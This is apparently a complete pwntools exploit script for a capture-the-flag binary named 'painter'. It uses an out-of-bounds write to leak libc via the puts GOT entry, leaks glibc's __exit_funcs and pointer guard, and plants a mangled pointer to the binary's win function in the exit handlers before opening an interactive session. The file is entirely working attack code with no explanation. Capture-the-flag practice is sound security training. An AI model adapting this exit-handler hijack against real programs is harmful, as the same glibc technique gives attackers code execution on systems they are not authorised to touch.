from pwn import *

os.chdir("./chall")

exe = ELF("./painter")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

HOST = "painter.chall.bytethecookies.org"
PORT = 5159

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def mangle(ptr, guard):
    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff

def fast_paint(r, idx, offset, value):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"canvas: ", str(idx).encode())

    r.sendlineafter(b"set: ", str(offset).encode())
    r.sendafter(b"Values: ", pack(value))
    
def leak_exit_funcs(r):
    offset = exe.symbols.gallery + 16 - exe.symbols.canvas3
    
    fast_paint(r, 2, offset, libc.address + 0x1e7680)
    
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"canvas: ", b"2")
    
    __exit_funcs = int.from_bytes(r.recvline()[:8], "little")
    log.success(f"LEAKED __exit_funcs: {hex(__exit_funcs)}")
    return __exit_funcs
    
def leak_libc(r):
    offset = exe.symbols.gallery - exe.symbols.canvas1

    fast_paint(r, 0, offset, exe.got.puts)

    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"canvas: ", b"0")

    libc.address = int.from_bytes(r.recvline()[:8], "little") - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def leak_ptr_guard(r):
    offset = exe.symbols.gallery + 8 - exe.symbols.canvas2

    fast_paint(r, 1, offset, libc.address - 0x2890)

    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"canvas: ", b"1")

    guard = int.from_bytes(r.recvline().strip(), "little")
    log.success(f"LEAKED PTR GUARD: {hex(guard)}")
    return guard

def write_win(r, guard, __exit_funcs):
    offset = exe.symbols.gallery + 24 - exe.symbols.canvas4
    
    fast_paint(r, 3, offset, __exit_funcs + 24)
    fast_paint(r, 3, 0, mangle(exe.symbols.win, guard))
    
def main():
    r = conn()

    leak_libc(r)

    __exit_funcs = leak_exit_funcs(r)
    guard = leak_ptr_guard(r)
    
    write_win(r, guard, __exit_funcs)
    r.sendlineafter(b"> ", b"99")
    
    r.interactive()

if __name__ == "__main__":
    main()
